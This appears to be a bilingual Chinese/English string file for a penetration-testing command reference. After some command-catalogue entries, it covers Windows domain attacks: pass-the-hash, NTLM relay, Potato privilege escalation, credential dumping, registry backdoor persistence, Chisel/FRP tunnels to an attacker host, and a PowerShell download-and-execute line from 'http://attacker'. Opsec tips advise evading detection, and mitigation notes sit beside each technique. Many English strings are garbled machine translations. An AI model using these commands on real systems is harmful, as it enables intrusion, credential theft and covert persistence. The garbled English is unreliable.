description.zh: 用 Get-Command、Get-Help、Get-Module 动态枚举当前电脑实际可用的所有 PowerShell 命令和模块。
description.en: Dynamically enumerate all PowerShell commands and modules available on the current computer using Get-Command, Get-Help, and Get-Module.

installation.zh: Windows PowerShell 内置；PowerShell 7 可单独安装。
installation.en: Windows PowerShell is built in; PowerShell 7 can be installed separately.

description.zh: 列出当前会话可发现的全部 PowerShell 命令。
description.en: List all PowerShell commands discoverable in the current session.

description.zh: 统计每个模块暴露的命令数量。
description.en: Count exposed commands by module.

description.zh: 列出本机可导入模块。
description.en: List modules available for import on this computer.

description.zh: 查看指定命令语法，不执行原命令。
description.en: Show syntax for a command without executing it.

description.zh: 查看指定命令完整帮助。
description.en: Show full help for a command.

description.zh: 打开官方在线帮助页面。
description.en: Open the official online help page.

description.zh: 下载或更新本机帮助文件，便于离线查看。
description.en: Download or update help files for the current user.

description.zh: 列出别名及其指向的命令。
description.en: List aliases and the commands they resolve to.

description.zh: 当前 Windows PowerShell 环境可发现的全部 Cmdlet 帮助索引。
description.en: Help index for all cmdlets discoverable in the current Windows PowerShell environment.

installation.zh: 由 scripts/generate-command-catalogs.mjs 在当前 Windows PowerShell 环境中通过 Get-Command -All 生成。
installation.en: Generated by scripts/generate-command-catalogs.mjs from the current Windows PowerShell environment using Get-Command -All.

name.zh: Linux 系统管理命令索引

description.zh: systemd、进程、用户、权限、日志、内核、审计和磁盘管理命令手册索引。
description.en: Manual index for systemd, process, user, permission, log, kernel, audit, and disk administration commands.

installation.zh: 静态索引来自 POSIX/GNU、常见 Linux 发行版、systemd、iproute2、包管理、容器与开发工具；实际机器完整命令请配合“Linux 全命令动态枚举”。
installation.en: Static index based on POSIX/GNU utilities, common Linux distributions, systemd, iproute2, package managers, containers, and developer tools; use Linux full-command discovery for an exact host inventory.

analysis.zh: BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。
analysis.en: BloodHound can discover attack paths within the domain, such as privilege escalation paths, session information, and group relationships.

opsecTips.en: BloodHound collection generates a large volume of LDAP queries

opsecTips.zh: 可能触发域控制器告警
建议在非工作时间执行
opsecTips.en: Recommended to run during non-business hours

overview.zh: BloodHound是一款用于分析Active Directory信任关系的工具，可以可视化攻击路径，帮助发现权限提升机会。
overview.en: BloodHound is a tool for analyzing Active Directory trust relationships, capable of visualizing attack paths and discovering privilege escalation opportunities.

vulnerability.zh: Active Directory的复杂信任关系可能导致意外的权限提升路径，BloodHound可以发现这些路径。
vulnerability.en: Complex trust relationships in Active Directory may lead to unexpected privilege escalation paths, which BloodHound can uncover.

exploitation.zh: 利用流程：1) 采集域信息；2) 导入BloodHound；3) 分析攻击路径；4) 发现权限提升机会；5) 执行攻击。
exploitation.en: Exploitation workflow: 1) Collect domain information; 2) Import into BloodHound; 3) Analyze attack paths; 4) Identify privilege escalation opportunities; 5) Execute the attack.

mitigation.zh: 防御措施：1) 定期审计AD权限；2) 最小权限原则；3) 监控异常LDAP查询；4) 清理不必要的信任关系。
mitigation.en: Defenses: 1) Regularly audit AD permissions; 2) Apply the principle of least privilege; 3) Monitor anomalous LDAP queries; 4) Remove unnecessary trust relationships.

analysis.zh: SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。
analysis.en: SPN scanning reveals service accounts running in the domain, laying the groundwork for Kerberoasting attacks.

opsecTips.en: Can be used for subsequent Kerberoasting attacks

overview.zh: SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。
overview.en: SPN scanning reveals service accounts running in the domain, laying the groundwork for Kerberoasting attacks.

vulnerability.zh: SPN是Kerberos认证的一部分，攻击者可以通过SPN找到高价值的服务账户。
vulnerability.en: SPNs are part of Kerberos authentication; attackers can use them to locate high-value service accounts.

exploitation.zh: 利用流程：1) 扫描SPN；2) 识别高价值账户；3) 请求Kerberos票据；4) 离线破解。
exploitation.en: Exploitation workflow: 1) Scan for SPNs; 2) Identify high-value accounts; 3) Request Kerberos tickets; 4) Crack offline.

mitigation.zh: 防御措施：1) 服务账户使用强密码；2) 监控异常的SPN查询；3) 定期审计SPN账户。
mitigation.en: Defenses: 1) Use strong passwords for service accounts; 2) Monitor anomalous SPN queries; 3) Regularly audit SPN-associated accounts.

opsecTips.zh: 高速扫描可能触发IDS告警
opsecTips.en: High-speed scans may trigger IDS alerts
Use a lower scan rate to stay under the radar
Spread scans across different time windows

overview.zh: 端口扫描是内网渗透的第一步，用于发现开放的服务和潜在的攻击面。
overview.en: Port scanning is the first step in intranet penetration, used to discover open services and potential attack surfaces.

vulnerability.zh: 内网中可能存在未打补丁的服务或配置不当的服务。
vulnerability.en: The internal network may harbor unpatched or misconfigured services.

exploitation.zh: 利用流程：1) 发现存活主机；2) 扫描开放端口；3) 识别服务版本；4) 寻找漏洞利用。
exploitation.en: Exploitation workflow: 1) Discover live hosts; 2) Scan open ports; 3) Identify service versions; 4) Find and exploit vulnerabilities.

mitigation.zh: 防御措施：1) 关闭不必要的服务；2) 配置防火墙规则；3) 监控异常扫描行为。
mitigation.en: Defensemeasures: 1) Close not Necessary Service; 2) ConfigurationFirewallRule; 3) MonitoringExceptionScanbehavior.

mitigation.zh: 防御措施：1) 限制LDAP查询权限；2) 监控异常查询；3) 实施最小权限原则。

overview.zh: Mimikatz是一款强大的Windows安全测试工具，可以从内存中提取明文密码、哈希、Kerberos票据等凭证信息。
overview.en: Mimikatz is a powerful Windows security testing tool that can extract plaintext passwords, hashes, Kerberos tickets, and other credentials from memory.

vulnerability.zh: Windows系统将用户凭证存储在LSASS进程内存中，Mimikatz可以直接读取这些凭证。这是Windows认证机制的设计特性。
vulnerability.en: Windows stores user credentials in the LSASS process memory, and Mimikatz can read them directly. This is by design in the Windows authentication mechanism.

exploitation.zh: 利用流程：1) 获取管理员权限；2) 绕过杀毒软件；3) 执行Mimikatz抓取凭证；4) 使用凭证进行横向移动；5) 提升到域管理员权限。
exploitation.en: Exploitation workflow: 1) Obtain administrator privileges; 2) Bypass antivirus; 3) Run Mimikatz to dump credentials; 4) Use credentials for lateral movement; 5) Escalate to Domain Admin.

mitigation.zh: 防御措施：1) 启用Credential Guard；2) 限制管理员权限；3) 监控LSASS访问；4) 部署EDR解决方案；5) 定期更改密码。
mitigation.en: Defenses: 1) Enable Credential Guard; 2) Restrict administrator privileges; 3) Monitor LSASS access; 4) Deploy an EDR solution; 5) Rotate passwords regularly.

overview.zh: Kerberoasting是一种针对Kerberos协议的攻击，攻击者可以请求服务票据并离线破解服务账户密码。
overview.en: Kerberoasting is an attack targeting the Kerberos protocol where the attacker requests service tickets and cracks service account passwords offline.

vulnerability.zh: Kerberos服务票据使用服务账户密码加密，攻击者可以请求票据后离线破解。服务账户通常密码复杂度较低。
vulnerability.en: Kerberos service tickets are encrypted with the service account password. Attackers can request tickets and crack them offline. Service accounts often have weak password complexity.

exploitation.zh: 利用流程：1) 获取任意域用户凭证；2) 查询域内SPN；3) 请求服务票据；4) 导出票据；5) 离线破解密码。
exploitation.en: Exploitation workflow: 1) Obtain any domain user credentials; 2) Query SPNs in the domain; 3) Request service tickets; 4) Export tickets; 5) Crack passwords offline.

mitigation.zh: 防御措施：1) 服务账户使用强密码；2) 监控异常的票据请求；3) 定期轮换服务账户密码；4) 部署蜜罐账户检测攻击。
mitigation.en: Defenses: 1) Use strong passwords for service accounts; 2) Monitor anomalous ticket requests; 3) Rotate service account passwords regularly; 4) Deploy honeypot accounts to detect attacks.

analysis.en: AS-REP Roasting obtains hashes for users with Pre-authentication disabled, which can be cracked offline to reveal plaintext passwords.

overview.zh: AS-REP Roasting是一种针对禁用Kerberos Pre-authentication用户的攻击。
overview.en: AS-REP Roasting is OneTargeting for DisableKerberos Pre-authenticationUsers Attack.

vulnerability.zh: 禁用Pre-auth的用户可以直接获取AS-REP，其中包含可离线破解的哈希。
vulnerability.en: Users with Pre-authentication disabled allow direct retrieval of AS-REP responses containing offline-crackable hashes.

exploitation.zh: 利用流程：1) 查找禁用Pre-auth的用户；2) 请求AS-REP；3) 提取哈希；4) 离线破解。
exploitation.en: Exploitation workflow: 1) Find users with Pre-auth disabled; 2) Request AS-REP; 3) Extract hashes; 4) Crack offline.

mitigation.zh: 防御措施：1) 启用所有用户的Pre-auth；2) 监控异常的AS-REQ；3) 使用强密码。
mitigation.en: Defenses: 1) Enable Pre-authentication for all users; 2) Monitor anomalous AS-REQ requests; 3) Use strong passwords.

execution.title: gpp-decrypt
execution.command: gpp-decrypt HASH

description.zh: 解密GPP密码哈希
description.en: DecryptionGPPPasswordhash

execution.command: Get-GPPPassword.py domain/user:password@dc_ip

description.zh: 使用Impacket提取GPP密码
description.en: UseImpacketExtractGPPPassword

analysis.zh: GPP密码使用公开的密钥加密，可以被解密获取明文密码。
analysis.en: GPPPasswordUsepublic keyEncryption, can by DecryptionObtainplaintextPassword.

opsecTips.zh: GPP密码是常见的信息泄露点
只需要普通域用户权限
opsecTips.en: Only requires regular domain user privileges

opsecTips.zh: MS14-025修复后新密码不会被存储
opsecTips.en: After the MS14-025 patch, new passwords will no longer be stored this way

overview.zh: 组策略首选项(GPP)可以存储本地管理员密码，使用公开密钥加密，可以被解密。
overview.en: Group Policy Preferences (GPP) can store local administrator passwords encrypted with a publicly known key, making them decryptable.

vulnerability.zh: GPP使用公开的AES密钥加密密码，任何人都可以解密。
vulnerability.en: GPP uses a publicly disclosed AES key to encrypt passwords — anyone can decrypt them.

exploitation.zh: 利用流程：1) 访问SYSVOL；2) 查找GPP XML文件；3) 提取cpassword；4) 解密密码。
exploitation.en: Exploitationworkflow: 1) AccessSYSVOL; 2) FindGPP XMLFile; 3) Extractcpassword; 4) DecryptionPassword.

mitigation.zh: 防御措施：1) 安装MS14-025补丁；2) 删除现有的GPP密码；3) 使用LAPS管理本地管理员密码。
mitigation.en: Defenses: 1) Install the MS14-025 patch; 2) Delete existing GPP passwords; 3) Use LAPS to manage local administrator passwords.

description.zh: 使用PsExec进行横向移动
description.en: UsePsExec perform Lateral Movement

prerequisites.zh: 拥有目标机器管理员凭证
prerequisites.en: Possess administrator credentials for the target machine

execution.command: psexec.py domain/user:password@target_ip

description.zh: 使用Impacket的psexec.py连接目标
description.en: UseImpacket psexec.pyConnectionTarget

execution.command: psexec.py -hashes :NTLM_HASH domain/user@target_ip

description.zh: 使用NTLM哈希进行Pass-the-Hash
description.en: UseNTLMhash perform Pass-the-Hash

explanation.en: NTLM hash value (LM:NTLM format — leave LM blank)

execution.command: psexec.py domain/user:password@target_ip "whoami"

description.zh: 在目标机器执行命令
description.en: in TargetMachineExecute Command

execution.title: Windows PsExec
execution.command: PsExec.exe \\target_ip -u domain\user -p password cmd.exe

description.zh: 使用Sysinternals PsExec
description.en: UseSysinternals PsExec

description.zh: 使用自定义服务名避免检测
description.en: Use a custom service name to avoid detection

description.zh: 使用smbexec.py，不写入磁盘
description.en: Usesmbexec.py, not WriteDisk

analysis.zh: PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。
analysis.en: PsExec creates a service on the target machine via SMB and executes commands; on success, you obtain a shell on the target.

opsecTips.zh: PsExec会在目标机器创建服务，容易被检测
opsecTips.en: PsExec creates a service on the target, making it easy to detect

opsecTips.zh: 服务名称和二进制文件可能触发告警
opsecTips.en: The service name and binary file may trigger alerts

opsecTips.zh: 考虑使用更隐蔽的横向移动方式
opsecTips.en: Consider using stealthier lateral movement techniques

overview.zh: PsExec是Sysinternals套件中的工具，允许在远程机器上执行进程。攻击者常用于横向移动。
overview.en: PsExec is a tool from the Sysinternals suite that allows remote process execution. It is commonly used by attackers for lateral movement.

vulnerability.zh: PsExec利用SMB协议和Windows服务机制，通过ADMIN$共享上传可执行文件并创建服务执行。
vulnerability.en: PsExecExploitationSMBProtocol and WindowsServiceMechanism, throughADMIN$SharesUploadCanExecuteFile and CreateServiceExecute.

exploitation.zh: 利用流程：1) 获取目标机器凭证；2) 通过SMB连接目标；3) 上传可执行文件到ADMIN$；4) 创建并启动服务；5) 获取远程Shell。
exploitation.en: Exploitationworkflow: 1) ObtainTargetMachineCredentials; 2) throughSMBConnectionTarget; 3) UploadCanExecuteFile to ADMIN$; 4) Create and Start Service; 5) ObtainRemoteShell.

mitigation.zh: 防御措施：1) 禁用ADMIN$共享；2) 限制SMB访问；3) 监控服务创建；4) 部署EDR检测异常行为。
mitigation.en: Defensemeasures: 1) DisableADMIN$Shares; 2) RestrictSMBAccess; 3) MonitoringServiceCreate; 4) DeploymentEDRDetectionExceptionbehavior.

description.zh: 使用WMI进行横向移动
description.en: UseWMI perform Lateral Movement

prerequisites.zh: 拥有目标机器管理员凭证
prerequisites.en: Possess administrator credentials for the target machine

execution.command: wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"

description.zh: 使用WMIC远程执行命令
description.en: UseWMICRemoteExecute Command

execution.title: Impacket wmiexec
execution.command: wmiexec.py domain/user:password@target_ip

description.zh: 使用Impacket的wmiexec.py
description.en: UseImpacket wmiexec.py

execution.command: wmiexec.py -hashes :NTLM_HASH domain/user@target_ip

description.zh: Pass-the-Hash通过WMI
description.en: Pass-the-HashthroughWMI

execution.title: PowerShell WMI
execution.command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred

description.zh: 使用PowerShell WMI
description.en: UsePowerShell WMI

description.zh: 通过WMI安装MSI包执行代码
description.en: throughWMIInstallationMSIPackageExecuteCode

analysis.zh: WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。
analysis.en: WMI lateral movement does not create a service on the target, making it stealthier than PsExec.

opsecTips.zh: WMI执行不会留下明显的文件痕迹
opsecTips.en: WMI execution does not leave obvious file artifacts
However, WMI activity may still be monitored

opsecTips.zh: 命令输出通过临时文件获取

overview.zh: WMI(Windows Management Instrumentation)是Windows管理框架的核心组件，可用于远程管理和命令执行。
overview.en: WMI(Windows Management Instrumentation) is WindowsManagementFramework CoreComponent, Can used for RemoteManagement and Command Execution.

vulnerability.zh: WMI允许管理员远程管理Windows系统，攻击者可以利用此功能执行命令和横向移动。
vulnerability.en: WMI allows administrators to remotely manage Windows systems; attackers can abuse this capability to execute commands and move laterally.

exploitation.zh: 利用流程：1) 获取目标凭证；2) 通过WMI连接目标；3) 调用Win32_Process创建进程；4) 执行命令获取结果。
exploitation.en: Exploitationworkflow: 1) ObtainTargetCredentials; 2) throughWMIConnectionTarget; 3) CallWin32_ProcessCreateProcess; 4) Execute CommandObtainResult.

mitigation.zh: 防御措施：1) 限制WMI远程访问；2) 监控WMI活动；3) 部署EDR检测异常WMI调用；4) 使用防火墙限制135端口。
mitigation.en: Defenses: 1) Restrict remote WMI access; 2) Monitor WMI activity; 3) Deploy EDR to detect anomalous WMI calls; 4) Use firewall rules to restrict port 135.

description.zh: 使用NTLM哈希进行身份验证
description.en: UseNTLMhash perform identityVerify

prerequisites.en: Target machine has SMB/WMI ports open

execution.title: Impacket PtH
execution.command: psexec.py -hashes :NTHASH domain/user@target_ip

description.zh: 使用Impacket进行PtH
description.en: UseImpacket perform PtH

execution.title: CrackMapExec PtH
execution.command: crackmapexec smb target_ip -u user -H NTHASH -d domain

description.zh: 使用CrackMapExec进行PtH
description.en: UseCrackMapExec perform PtH

execution.title: Windows PtH
execution.command: sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH

description.zh: 使用Mimikatz进行PtH
description.en: UseMimikatz perform PtH

execution.title: PowerShell PtH
execution.command: Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip

description.zh: 使用PowerShell进行PtH
description.en: UsePowerShell perform PtH

description.zh: 将哈希转换为Kerberos票据
description.en: Convert hashes to Kerberos tickets

analysis.zh: PtH成功后可以该用户身份访问目标机器，无需明文密码。
analysis.en: After a successful PtH, you can access the target machine as that user without the plaintext password.

opsecTips.zh: PtH不会产生登录日志中的密码验证
opsecTips.en: PtH does not generate password verification entries in the logon log

opsecTips.zh: 但会留下网络登录日志
opsecTips.en: But it does leave network logon entries
Pay attention to timestamps and source IPs

overview.zh: Pass-the-Hash是一种利用NTLM哈希进行身份验证的攻击技术，攻击者无需知道明文密码即可通过认证。
overview.en: Pass-the-Hash is an attack technique that uses NTLM hashes for authentication — the attacker does not need the plaintext password.

vulnerability.zh: NTLM认证机制允许使用密码哈希进行认证，一旦哈希泄露，攻击者可以冒充用户身份。
vulnerability.en: The NTLM authentication mechanism allows authentication using password hashes; once a hash is leaked, an attacker can impersonate the user.

exploitation.zh: 利用流程：1) 获取用户NTLM哈希；2) 使用工具进行PtH；3) 获取目标机器访问权限；4) 执行后续攻击。
exploitation.en: Exploitation workflow: 1) Obtain the user's NTLM hash; 2) Perform PtH with an appropriate tool; 3) Gain access to the target machine; 4) Execute follow-up attacks.

mitigation.zh: 防御措施：1) 限制NTLM认证；2) 启用Kerberos；3) 监控异常登录；4) 使用受限管理模式。
mitigation.en: Defenses: 1) Restrict NTLM authentication; 2) Enforce Kerberos; 3) Monitor anomalous logons; 4) Use Restricted Admin mode.

description.zh: NTLM中继攻击技术
description.en: NTLMRelayAttackTechnique

prerequisites.en: Target machine has SMB port open
Can coerce the target machine to authenticate

execution.command: responder -I eth0 -wrf

description.zh: 启动Responder监听NTLM认证
description.en: StartResponderlisteningNTLMAuthentication

execution.command: ntlmrelayx.py -tf targets.txt -smb2support

description.zh: 使用ntlmrelayx进行中继攻击
description.en: Usentlmrelayx perform RelayAttack

execution.command: ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user

description.zh: 中继到LDAP进行权限提升
description.en: Relay to LDAP perform Privilege Escalation

execution.command: mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip

description.zh: 使用IPv6进行NTLM中继
description.en: UseIPv6 perform NTLMRelay

description.zh: 移除MIC标志绕过签名验证
description.en: RemoveMICflagBypassSignatureVerify

analysis.zh: NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。
analysis.en: A successful NTLM Relay grants access to the target machine or escalates domain privileges.

opsecTips.zh: 需要目标机器未启用SMB签名
域控制器默认启用签名

overview.zh: NTLM Relay是一种中间人攻击，攻击者将捕获的NTLM认证中继到其他服务，实现身份冒用。
overview.en: NTLM Relay is a man-in-the-middle attack where the attacker relays captured NTLM authentication to another service, impersonating the victim.

vulnerability.zh: NTLM协议本身存在设计缺陷，允许中继攻击。如果目标服务器未启用签名验证，攻击者可以冒充受害者身份。
vulnerability.en: The NTLM protocol has inherent design flaws that permit relay attacks. If the target server does not enforce signing, the attacker can impersonate the victim.

exploitation.zh: 利用流程：1) 启动Responder或ntlmrelayx监听；2) 诱导目标机器发起认证；3) 中继认证到目标服务；4) 获取访问权限或执行操作。
exploitation.en: Exploitation workflow: 1) Start Responder or ntlmrelayx listener; 2) Coerce the target to authenticate; 3) Relay the authentication to the target service; 4) Gain access or execute operations.

mitigation.zh: 防御措施：1) 启用SMB签名；2) 禁用NTLM认证；3) 启用Extended Protection for Authentication；4) 监控异常认证行为。
mitigation.en: Defensemeasures: 1) EnableSMBSignature; 2) DisableNTLMAuthentication; 3) EnableExtended Protection for Authentication; 4) MonitoringExceptionAuthenticationbehavior.

description.zh: 窃取和模拟Windows访问令牌
description.en: Steal and impersonate Windows access tokens

prerequisites.en: Already have access to the target machine

execution.command: mimikatz.exe "privilege::debug" "token::list" "exit"

description.zh: 列出系统中所有可用令牌
description.en: List all available tokens on the system

execution.command: mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"

description.zh: 窃取指定用户的令牌
description.en: StealspecifiedUsers Token

execution.command: JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

description.zh: JuicyPotato提权（需要SeImpersonatePrivilege）
description.en: JuicyPotato Privilege Escalation(requiresSeImpersonatePrivilege)

execution.title: PrintSpoofer
execution.command: PrintSpoofer.exe -i -c cmd

description.zh: PrintSpoofer提权
description.en: PrintSpoofer Privilege Escalation

execution.title: GodPotato
execution.command: GodPotato.exe -cmd "cmd /c whoami"

description.zh: GodPotato提权，支持更多Windows版本
description.en: GodPotato privilege escalation — supports a wider range of Windows versions

description.zh: RoguePotato，绕过更多限制
description.en: RoguePotato — bypasses additional restrictions

analysis.zh: 令牌窃取成功后可以模拟高权限用户身份执行操作。
analysis.en: After a successful token theft, you can impersonate a high-privilege user to execute operations.

opsecTips.en: Potato family tools exploit the DCOM mechanism
Different Windows versions require different CLSIDs

overview.zh: Windows访问令牌(Access Token)包含用户身份和权限信息，攻击者可以窃取高权限用户的令牌来提升权限。
overview.en: Windows Access Tokens contain user identity and privilege information; an attacker can steal a high-privilege user's token to escalate privileges.

vulnerability.zh: Windows允许进程模拟其他用户的令牌，如果服务账户具有SeImpersonatePrivilege权限，攻击者可以利用此权限获取SYSTEM权限。
vulnerability.en: Windows allows processes to impersonate other users' tokens. If a service account has SeImpersonatePrivilege, an attacker can leverage it to obtain SYSTEM privileges.

exploitation.zh: 利用流程：1) 获取SeImpersonatePrivilege权限的服务账户；2) 使用Potato系列工具触发SYSTEM进程连接；3) 窃取SYSTEM令牌；4) 以SYSTEM权限执行命令。
exploitation.en: Exploitation workflow: 1) Obtain a service account with SeImpersonatePrivilege; 2) Use a Potato family tool to trigger a SYSTEM process connection; 3) Steal the SYSTEM token; 4) Execute commands as SYSTEM.

mitigation.zh: 防御措施：1) 移除不必要的服务账户SeImpersonatePrivilege权限；2) 监控令牌操作；3) 部署EDR检测异常行为；4) 及时更新系统补丁。
mitigation.en: Defenses: 1) Remove unnecessary SeImpersonatePrivilege from service accounts; 2) Monitor token manipulation; 3) Deploy EDR to detect anomalous behavior; 4) Apply system patches promptly.

description.zh: 通过注册表实现权限维持
description.en: throughRegistryImplementPersistence

prerequisites.en: Already have access to the target machine

execution.command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f

description.zh: 添加Run键实现开机自启
description.en: Add a Run key for auto-start on boot

execution.command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

description.zh: RunOnce键，执行一次后删除
description.en: RunOnce key — executes once then deletes itself

execution.title: Winlogon Helper
execution.command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f

description.zh: 修改Userinit实现持久化
description.en: ModifyUserinitImplementPersistence

execution.command: sc create Backdoor binPath= "C:\backdoor.exe" start= auto

description.zh: 创建服务实现持久化
description.en: CreateServiceImplementPersistence

description.zh: 使用空字节隐藏注册表键
description.en: Use a null byte to hide the registry key

analysis.zh: 注册表持久化会在系统启动或用户登录时执行恶意程序。
analysis.en: Registry PersistenceWill in SystemStart or UsersLoginWhenExecuteMaliciousProgram.

opsecTips.zh: Run键是最常见的持久化方式，容易被检测
opsecTips.en: Run keys are the most common persistence method and are easily detected

opsecTips.zh: 考虑使用更隐蔽的方式
定期检查注册表异常项
opsecTips.en: Regularly check for anomalous registry entries

overview.zh: Windows注册表提供了多种持久化机制，攻击者可以在系统启动或用户登录时自动执行恶意代码。
overview.en: The Windows Registry provides multiple persistence mechanisms; attackers can auto-execute malicious code at system startup or user logon.

vulnerability.zh: Windows注册表中的多个键值可以在特定时机自动执行程序，这是系统设计功能，但可被攻击者滥用。
vulnerability.en: Multiple registry keys can automatically execute programs at specific events — this is a system design feature but can be abused by attackers.

exploitation.zh: 利用流程：1) 获取管理员权限；2) 选择持久化位置；3) 添加恶意程序路径；4) 等待系统重启或用户登录；5) 恶意程序自动执行。
exploitation.en: Exploitation workflow: 1) Obtain administrator privileges; 2) Choose a persistence location; 3) Add a malicious program path; 4) Wait for system restart or user logon; 5) The malicious program executes automatically.

mitigation.zh: 防御措施：1) 监控注册表关键键值变化；2) 使用白名单限制程序执行；3) 定期审计持久化项；4) 部署EDR检测异常行为。
mitigation.en: Defenses: 1) Monitor changes to critical registry keys; 2) Use application whitelisting to restrict execution; 3) Regularly audit persistence entries; 4) Deploy EDR to detect anomalous behavior.

description.zh: 使用FRP建立内网穿透隧道
description.en: UseFRPEstablishInternal network tunnelingtunnel

execution.command:
[common]
bind_port = 7000

description.en: FRPServer-SideConfiguration Filefrps.ini

description.en: StartFRPServer-Side

execution.command: frpc.exe -c frpc.ini

description.en: StartFRPClient

analysis.zh: FRP可以建立TCP隧道，将内网服务映射到公网。
analysis.en: FRPcanEstablishTCP Tunnel, will Internal networkServicemapping to Public network.

overview.zh: FRP是一款高性能的反向代理应用，可以将内网服务暴露到公网。
overview.en: FRP is a high-performance reverse proxy that can expose internal network services to the public internet.

vulnerability.zh: 内网机器可以访问公网时，攻击者可以建立隧道将内网服务映射出去。
vulnerability.en: When internal machines can reach the internet, an attacker can establish a tunnel to map internal services outward.

exploitation.zh: 利用流程：1) 在公网服务器部署FRP服务端；2) 在内网机器运行FRP客户端；3) 建立隧道连接；4) 通过隧道访问内网服务。
exploitation.en: Exploitationworkflow: 1) in Public networkServerDeploymentFRPServer-Side; 2) in Internal networkMachineRunFRPClient; 3) EstablishtunnelConnection; 4) throughtunnelAccessInternal networkService.

mitigation.zh: 防御措施：1) 监控异常外联流量；2) 限制出站连接；3) 部署流量分析设备；4) 禁止未授权的代理工具。
mitigation.en: Defenses: 1) Monitor anomalous outbound traffic; 2) Restrict outbound connections; 3) Deploy traffic analysis appliances; 4) Block unauthorized proxy tools.

description.zh: 使用Chisel建立内网穿透隧道
description.en: UseChiselEstablishInternal network tunnelingtunnel

execution.command: ./chisel server -p 8000 --reverse

description.zh: 启动Chisel服务端
description.en: StartChiselServer-Side

execution.command: chisel.exe client attacker_ip:8000 R:socks

description.zh: 建立反向SOCKS代理
description.en: EstablishReverse SOCKS Proxy

execution.command: chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389

description.zh: 端口转发
description.en: Port Forwarding

analysis.zh: Chisel可以建立HTTP隧道，穿透防火墙。
analysis.en: Chisel can establish HTTP tunnels that punch through firewalls.

overview.zh: Chisel是一款快速的TCP/UDP隧道工具，通过HTTP传输。
overview.en: Chisel is a fast TCP/UDP tunnel tool that transports data over HTTP.

vulnerability.zh: HTTP隧道可以绕过防火墙限制，将内网服务暴露出去。
vulnerability.en: HTTP tunnels can bypass firewall restrictions and expose internal services.

exploitation.zh: 利用流程：1) 在公网服务器运行Chisel服务端；2) 在内网机器运行Chisel客户端；3) 建立隧道；4) 通过代理访问内网。
exploitation.en: Exploitationworkflow: 1) in Public networkServerRunChiselServer-Side; 2) in Internal networkMachineRunChiselClient; 3) Establishtunnel; 4) throughProxyAccessInternal network.

mitigation.zh: 防御措施：1) 监控异常HTTP流量；2) 检测长连接；3) 部署流量分析。
mitigation.en: Defenses: 1) Monitor anomalous HTTP traffic; 2) Detect long-lived connections; 3) Deploy traffic analysis.

description.zh: PowerShell脚本免杀技术
description.en: PowerShellScriptAV evasionTechnique

execution.command: powershell -enc BASE64_ENCODED_COMMAND

description.zh: Base64编码执行
description.en: Base64 EncodingExecute

execution.command: IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")

description.en: Extract plaintext or Base64-encoded admin credentials from Windows unattended installation files (Unattend.xml/Sysprep)

prerequisites.zh: 本地文件系统读取权限
目标使用过无人值守部署

title.zh: 搜索无人值守安装文件

execution.command: dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul

description.zh: 在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中
description.en: Search default paths for Unattend/Sysprep config files that may remain on the system after Windows automated deployment

explanation.zh: 递归搜索并仅输出文件完整路径
Windows安装日志和配置默认存放目录
explanation.en: Default directory for Windows installation logs and configuration

explanation.zh: Sysprep系统准备工具配置目录
explanation.en: Sysprep system preparation tool configuration directory

explanation.zh: 抑制文件未找到的错误输出

title.en: Full Disk Search for Unattend Files

execution.command:
# CMD方式
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell方式
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName

description.zh: 当默认路径找不到时，全盘递归搜索所有可能的无人值守文件
description.en: When default paths yield nothing, recursively search all drives for possible unattended files

explanation.zh: 按通配符模式匹配文件名

execution.command:
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }

description.zh: 从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中
description.en: Extract password fields from Unattend.xml; passwords may be stored as plaintext or Base64 in <Password>/<AdminPassword>/<AutoLogon> nodes

explanation.zh: 不区分大小写搜索指定字符串
自动登录配置(含明文密码)
将XML文件解析为PowerShell XML对象
explanation.en: will XMLFileParse is PowerShell XML for Object

execution.command:
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt

